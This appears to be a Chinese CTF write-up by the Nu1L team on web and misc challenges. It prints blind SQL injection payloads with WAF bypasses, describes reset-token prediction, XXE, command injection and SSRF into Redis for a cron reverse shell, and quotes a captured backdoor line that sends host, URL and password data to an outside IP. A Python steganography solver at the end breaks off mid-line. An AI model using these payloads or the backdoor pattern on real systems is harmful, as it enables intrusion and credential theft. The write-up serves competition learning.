Nu1L-Writeup 
Web 
Time, grasp is gold, catch up is running water. 
查看源码可以得到管理员邮箱，重置密码时候大小写过滤不严，导致可以拿到
重置密码的连接，然后发现 token 参数是 md5(time())，并且提示 ip 不符合，猜
测 xff，但服务器时间与 token 的时间相差 8h，于是遍历，然后重置密码。 
进入后台，存在 XXE 漏洞，blindxxe，然后最后拿到 flag： 
简陋的博客 
变量覆盖，只过滤 get，没过滤 post，经过测试，发现是参数是拼接到反引号，
于是就很容易了： 
山水集团 
打开商品列表，看到页面里那个分享里有个能转换 ID 到 base64(某某加密)的接
口，于是就本地起个代理 
waf 拦截的比较多, 几个字符串处理函数，union，逗号，空格，/，*，=等 
最后试了一下 postion(str1 IN str2)函数 
空格就用括号绕过，=用!(<>)绕过 
/?id=(1)or(!(position((%27user_name§b§%27)IN(select(group_concat(COLUMN_N
AME))from(information_schema.COLUMNS)))%3C%3E1)) 
burp 按位跑一下 
拿到表 users，列名 user_name,user_pass 
然后是注入出数据 
GET 
/?id=(1)or(!(position((%27ab@15!74587~caibudao§b§%27)IN(select(user_pass)from
(users)))<>1)) HTTP/1.1 
以上是 20 位密码 
用户名区分大小写，可以爆破一下，暂时没想到怎么不爆破验证。。因为他
waf 拦截的很严 
先生成字典 
然后跑一下就 ok 
然后是登陆 
登陆时发现 
查看 html 源码 
可以用 https://unicode-table.com/cn/#latin-1-supplement 
Unicode 相似字符集绕过 
用户名 Q1t0ngW3ï 
密码 ab@15!74587~caibudao 
然后 bash 弹 shell~ 
然后在 home 目录下找到 flag 
中国菜刀 
抓包发现一个后门地址： 
file_get_contents('http://118.89.225.190/shellbox.php?shell='.$_SERVER[HTTP_HO
ST].$_SERVER[REQUEST_URI].'_Pwd='.key($_POST));;echo("|/a.php_Pwd=x 
js 就是原生 js 读源码的：
/?content= 
拿到 flag 最后。 
短域名 
1. 在 vps 上用 nc 监听，发现当生成短域名的时候，会发送一次 get 请求，而
且强行断开 造成 http 包 不完整，所以判断是 curl 发起请求，确认是一个
ssrf 漏洞，当地址存在 会有时间延迟 
2. 在 phpinfo.php 中发现 curl 扩展的信息，里面看到支持 dict 和一些其他的
协议，发现了 redis 的扩展，发现 redis 的地址 
3. dict 协议会将 get 参数单独在一行 发送，刚好符合 redis 未授权漏洞的利用 
4. ssrf 的绕过 是利用 dns rebinding 环境搭建百度即可 
5. 最后成功利用 ssrf 漏洞攻击 redis，写入定时任务，反弹 shell ，目录下就有
flag 
Misc 
签到题 
微博 
小小的 pdf 
foremost 就行，flag 在第三张图片里 
藏着东西的流量包 
先把 http 流量里的东西拿出来，发现 key.zip，解压得到一个字符串 
发现是 hacker.com 发送，然后去 dns 里，类似于 dns 远控，存在多个
hacker.com 的子域名，然后将所有的子域名拼接起来，unhex 后发现 base64，
最后发现是 aes，然后根据 key.zip 的 key 解密拿到最后 flag 
Mis.Chami
根据文件内第一行 Hamicyc 猜到是哈密顿回路，根据提示每个数字是两个字符
即两个顶点来建图，计算出哈密顿回路即为 flag。（这里题目有一点小问题，8
这个顶点度为 1 所以这个图不存在哈密顿回路，这里直接将 8 这个点忽略） 
Terraria
Terraria 版 I Wanna。服务器设置有毒，一身初始装备去打肉山后的各种穿墙
怪。 
似乎前面的人把路都搭的差不多了，稍稍向左再搭一点就可以看到 flag。 
我萌吗
Nobug.js 中提示隐写所用源码地址为: 
code address:./6YC46L2p/55qE/5Luj56CB55uu5b2V/asdasdasdasd.min.js 
可以直接分析写入的部分： 
var v = s.get(p, l); 
100 * Math.random() > 50 && !o.includes(p * h.width + l) ? (s.set(p, l, { 
    r: 255 - v.r, 
    g: 255 - v.g, 
    b: 255 - v.b, 
    a: v.a 
}), d.set(l, p, { 
    r: v.r, 
    g: b, 
    b: e.charCodeAt(b) 
})) : (s.set(p, l, { 
    r: v.r, 
    g: b, 
    b: 255 - v.b, 
    a: v.a 
}), d.set(p, l, { 
    r: v.r, 
    g: e.charCodeAt(b), 
    b: v.b, 
    a: v.a 
})) 
根据两张图 R G B 的变换关系即可推出对应隐写方式 
解题脚本： 
from PIL import Image 
im1 = Image.open("1.png") 
im2 = Image.open("dest.png") 
key = Image.open("key.png") 
w,h = im1.size 
flag = ['_'] * 100 
for i in range(1280): 
for j in range(1280): 
if im1.getpixel((i,j))[0] == 255 - im2.getpixel((i,j))[0] and 
im1.getpixel((i,j))[1] == 255 - im2.getpixel((i,j))[1] and im1.getpixel((i,j))[2] == 255 
- im2.getpixel((i,j))[2]: 
(x,y) = (key.getpixel((j,i))[1:]) 
flag[x] = chr(y) 
elif im1.getpixel((i,j))[2] == 255 - im2.getpixel((i,j))[2] and 
im2.getpixel((i,j))[1] ') 